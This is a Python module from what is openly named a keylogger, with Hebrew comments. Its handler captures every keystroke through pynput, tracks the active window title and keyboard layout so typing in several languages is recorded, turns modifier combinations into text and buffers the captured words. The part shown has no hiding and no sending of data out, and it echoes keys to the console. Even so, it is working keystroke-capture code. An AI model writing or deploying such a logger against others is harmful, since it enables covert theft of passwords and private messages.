from pynput.keyboard import Key
from window_utils import get_active_window_title, get_keyboard_layout, get_character_from_vk_code
from keyboard_utils import get_modifiers_text, MODIFIER_KEYS

def handle_key_press(key, keylogger_instance):
    '''
    טיפול בלחיצה על מקש:
    - עדכון החלון הפעיל ופריסת המקלדת בזמן אמת
    - תמיכה בשפות שונות גם במעבר ביניהן בזמן הקלדה
    - טיפול במקשי רווח, אנטר, מחיקה וכו'
    '''

    try:
        # עדכון החלון הפעיל וhwnd בזמן אמת
        keylogger_instance.current_window_title, hwnd = get_active_window_title()

        # קבלת ה-layout המעודכן לפי החלון הפעיל כרגע
        layout = get_keyboard_layout(hwnd)

        if key in MODIFIER_KEYS:
            keylogger_instance.pressed_keys.add(key)
            return

        if key == Key.esc:
            print("\n[Stopped by ESC]")
            keylogger_instance.flush_buffer(final=True)
            keylogger_instance.stop_logging = True
            return False

        elif key == Key.space:
            keylogger_instance.add_word()
            print(' ', end='', flush=True)

        elif key == Key.enter:
            keylogger_instance.add_word()
            keylogger_instance.flush_buffer(newline=True)
            print('\n', end='', flush=True)

        elif key == Key.backspace:
            if keylogger_instance.current_word:
                keylogger_instance.current_word = keylogger_instance.current_word[:-1]
                print('\b \b', end='', flush=True)

        elif hasattr(key, 'vk'):
            char = get_character_from_vk_code(key.vk, layout)
            modifiers = get_modifiers_text(keylogger_instance.pressed_keys)

            if modifiers:
                combo = '+'.join(modifiers)
                if char:
                    combo += f"+{char}"
                else:
                    combo += f"+{key.name if hasattr(key, 'name') else str(key)}"
                keylogger_instance.add_word(combo)
                print(f"[{combo}]", end='', flush=True)
            else:
                if char:
                    keylogger_instance.current_word += char
                    print(char, end='', flush=True)

    except Exception as e:
        print(f"\n[Error]: {e}")

    return ""
